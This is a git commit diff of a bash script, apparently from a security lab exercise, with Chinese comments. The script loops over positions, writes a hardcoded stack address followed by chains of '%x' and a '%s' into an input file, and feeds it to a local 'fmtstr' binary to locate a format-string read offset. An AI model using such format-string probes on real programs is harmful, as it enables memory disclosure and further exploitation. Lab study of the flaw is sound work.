89a9436927e978f92c0e2bd08e7bfb2d535a1053
Qmm <1259598502@qq.com>
2025-04-20 20:22:20 +0800

    qc

--- exp4/sh/input.sh
+++ exp4/sh/input.sh
@@ -1,11 +1,28 @@
 #!/bin/bash
 
 # echo $(printf "\x64\xe9\xff\xbf").%x.%x.%x.%x.%x.%x.%x.%x > input
+TARGET_ADDR="\x64\xe9\xff\xbf"  # 替换为你的目标地址
 
 for i in {1..20}; do
-  fmt="%x"
-  pattern=$(printf ".%s" $(yes "$fmt" | head -n $i))
-  echo $(printf "\x64\xe9\xff\xbf")$pattern.%s > input
-  echo "Testing with $i %x parameters:"
-  ./fmtstr < input | grep -A 1 "Please enter"
+  # 构造输入：前i-1个%x，第i个位置放%s，最后加一个%x用作对比
+  prefix=""
+  if [ $i -gt 1 ]; then
+    prefix=$(printf ".%%x%.0s" $(seq 1 $(($i-1))))
+  fi
+  
+  # 创建测试字符串
+  test_str=$(printf "${TARGET_ADDR}${prefix}.%%s.%%x")
+  
+  echo "Testing with %s at position $i:"
+  echo "$test_str" > input_test
+  
+  # 显示原始字符串（调试用）
+  echo "Input: $test_str"
+  
+  # 运行程序并获取输出
+  output=$(./fmtstr < input_test)
+  
+  # 提取并显示结果
+  echo "$output" | grep -A 2 "Please enter"
+  echo "----------------------------------------"
 done
